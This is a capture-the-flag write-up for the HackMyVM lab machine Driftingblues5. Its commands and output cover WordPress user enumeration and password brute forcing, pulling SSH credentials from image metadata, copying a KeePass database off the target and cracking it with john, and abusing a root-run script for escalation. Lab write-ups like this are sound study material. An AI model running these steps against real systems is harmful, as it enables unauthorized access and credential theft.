# Driftingblues5

## Executive Summary

| Machine | Author | Category | Platform |
| :--- | :--- | :--- | :--- |
| Driftingblues5 | tasiyanci | Beginner | HackMyVM |

**Summary:** This beginner-level machine required WordPress enumeration to discover valid user credentials, followed by steganographic analysis of image metadata to extract SSH credentials. Privilege escalation was achieved through cracking a KeePass database and exploiting a file monitoring script in the `/keyfolder` directory.

---

## Enumeration

### Network Discovery

Initial network discovery revealed the target machine at IP `192.168.100.20`:

```bash
PS C:\Windows\System32> arp -a

Interface: 192.168.100.1 --- 0x3
  Internet Address      Physical Address      Type
  192.168.100.20        08-00-27-08-bc-cb     dynamic
```

### Port Scanning

A comprehensive Nmap scan revealed two open services:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ nmap -sCV 192.168.100.20 -p-
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 05:07 WIB
Nmap scan report for 192.168.100.20
Host is up (0.0095s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 6a:fe:d6:17:23:cb:90:79:2b:b1:2d:37:53:97:46:58 (RSA)
|   256 5b:c4:68:d1:89:59:d7:48:b0:96:f3:11:87:1c:08:ac (ECDSA)
|_  256 61:39:66:88:1d:8f:f1:d0:40:61:1e:99:c5:1a:1f:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-generator: WordPress 5.6.2
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: diary &#8211; Just another WordPress site
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The scan identified:
- **SSH** (port 22): OpenSSH 7.9p1 Debian
- **HTTP** (port 80): Apache 2.4.38 running WordPress 5.6.2

### WordPress Enumeration

Using WPScan to enumerate WordPress users:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wpscan --url http://192.168.100.20/ --enumerate u
...
[+] abuzerkomurcu
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://192.168.100.20/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] gill
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] collins
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] satanic
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] gadd
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)
...
```

The scan revealed five WordPress users:
- **abuzerkomurcu**
- **gill**
- **collins**
- **satanic** 
- **gadd**

### Password Generation

A custom wordlist was created using CeWL to harvest words from the website:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ cewl http://192.168.100.20/ -w pass.txt
CeWL 6.2.1 (More Fixes) Robin Wood (robin@digi.ninja) (https://digi.ninja/)
```

## Initial Access

### WordPress Brute Force Attack

The harvested wordlist was used to perform a brute force attack against the discovered users:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wpscan --url http://192.168.100.20/ --usernames users.txt --passwords pass.txt
...
[+] Performing password attack on Wp Login against 5 user/s
[SUCCESS] - gill / [REDACTED]
Trying gadd / Author Time: 00:02:14 <=====================================         > (6953 / 8463) 82.15%  ETA: ??:??:??

[!] Valid Combinations Found:
 | Username: gill, Password: [REDACTED]
...
```

The attack successfully identified valid credentials:
- **Username**: gill
- **Password**: [REDACTED]

### WordPress Media Discovery

After gaining WordPress admin access, exploration of the media library revealed a hidden file at:
`http://192.168.100.20/wp-admin/upload.php`

A PNG file `dblogo.png` was found that wasn't displayed on the main website.
![alt text](image-1.png)

### Steganographic Analysis

The image was downloaded and analyzed using exiftool:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wget http://192.168.100.20/wp-content/uploads/2021/02/dblogo.png                                                    --2026-01-22 05:21:32--  http://192.168.100.20/wp-content/uploads/2021/02/dblogo.png
...
Length: 19041 (19K) [image/png]
Saving to: ‘dblogo.png’

dblogo.png                    100%[=================================================>]  18.59K  --.-KB/s    in 0.005s
...
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ exiftool dblogo.png
...
Text Layer Name                 : ssh password is [REDACTED] of course it is lowercase maybe not
Text Layer Text                 : ssh password is [REDACTED] of course it is lowercase maybe not :)
...
```

The metadata revealed hidden SSH credentials.

### SSH Access

Using the extracted credentials to access SSH:

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ ssh gill@192.168.100.20
...
gill@192.168.100.20's password:
...
gill@driftingblues:~$ id
uid=1000(gill) gid=1000(gill) groups=1000(gill)
```

Successfully gained shell access as user `gill`

## Privilege Escalation

### KeePass Database Cracking

During the enumeration of the home directory, a KeePass database file named `keyfile.kdbx` was identified. This file was transferred to the attacker's machine by setting up a temporary Python HTTP server on the victim machine and using `wget` to retrieve it.

```bash
gill@driftingblues:~$ python3 -m http.server 7777
Serving HTTP on 0.0.0.0 port 7777 (http://0.0.0.0:7777/) ...
192.168.100.1 - - [21/Jan/2026 16:24:27] "GET /keyfile.kdbx HTTP/1.1" 200 -

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ wget http://192.168.100.20:7777/keyfile.kdbx
--2026-01-22 05:24:29--  http://192.168.100.20:7777/keyfile.kdbx
Connecting to 192.168.100.20:7777... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2030 (2.0K) [application/octet-stream]
Saving to: ‘keyfile.kdbx’

keyfile.kdbx                  100%[=================================================>]   1.98K  --.-KB/s    in 0.006s

2026-01-22 05:24:29 (308 KB/s) - ‘keyfile.kdbx’ saved [2030/2030]
```

To access the contents of the database, the master password had to be cracked. `keepass2john` was used to extract the hash, which was then processed by `john` using the `rockyou.txt` wordlist.

```bash
┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ keepass2john keyfile.kdbx > hash

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 60000 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]       (keyfile)
1g 0:00:01:19 DONE (2026-01-22 05:27) 0.01258g/s 86.81p/s 86.81c/s 86.81C/s winston1..lollie
Use the "--show" option to display all of the cracked passwords reliably
Session completed.

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ john --show hash
keyfile:[REDACTED]
```

The master password was successfully identified. Opening the database with `keepassxc` revealed several entries, including titles such as **2real4surreal**, **buddyretard**, **fracturedocean** and others, which appeared to be potential keys or filenames for the next stage of exploitation.

```bash

┌──(ouba㉿CLIENT-DESKTOP)-[~]
└─$ keepassxc keyfile.kdbx
```
![alt text](image-2.png)
---

### File Monitoring Exploitation

An investigation of the root directory revealed a world-writable directory named `/keyfolder` with permissions set to `drwx---rwx`.

```bash
gill@driftingblues:~$ ls -la / | grep keyfolder
drwx---rwx  2 root root  4096 Feb 24  2021 keyfolder
```

By cross-referencing the entry titles found in the KeePass database, several files were created within `/keyfolder` to trigger a response from the system. After testing multiple names through `touch` and `rm` commands, creating the file **fracturedocean** successfully triggered a background script.

```bash
gill@driftingblues:/keyfolder$ rm buddyretard ; touch fracturedocean
gill@driftingblues:/keyfolder$ ls -la
total 12
drwx---rwx  2 root root 4096 Jan 21 16:42 .
drwxr-xr-x 19 root root 4096 Feb 24  2021 ..
-rw-r--r--  1 gill gill    0 Jan 21 16:41 fracturedocean
-rw-r--r--  1 root root   29 Jan 21 16:42 rootcreds.txt
```

The background process automatically generated a file named `rootcreds.txt` containing the root password.

```bash
gill@driftingblues:/keyfolder$ cat rootcreds.txt
root creds

[REDACTED]
```

---

### Root Access and Script Analysis

Using the discovered credentials, a transition to the root user was performed.

```bash
gill@driftingblues:/keyfolder$ su - root
Password: 
root@driftingblues:~# id
uid=0(root) gid=0(root) groups=0(root)
```

The mechanism behind this escalation was identified as a bash script located at `/root/key.sh`. This script continuously monitors the `/keyfolder` directory for the specific filename "fracturedocean" to write the credentials.

```bash
root@driftingblues:~# cat key.sh
#!/bin/bash

if [[ $(ls /keyfolder) == "fracturedocean" ]]; then
        echo "root creds" >> /keyfolder/rootcreds.txt
        echo "" >> /keyfolder/rootcreds.txt
        echo "[REDACTED]" >> /keyfolder/rootcreds.txt
fi
```

---

### Final Evidence

The final flags were retrieved from the root and user directories to confirm full system compromise.

```bash
root@driftingblues:~# cat /root/root.txt; echo; cat /home/gill/user.txt ; echo
[REDACTED]
[REDACTED]
```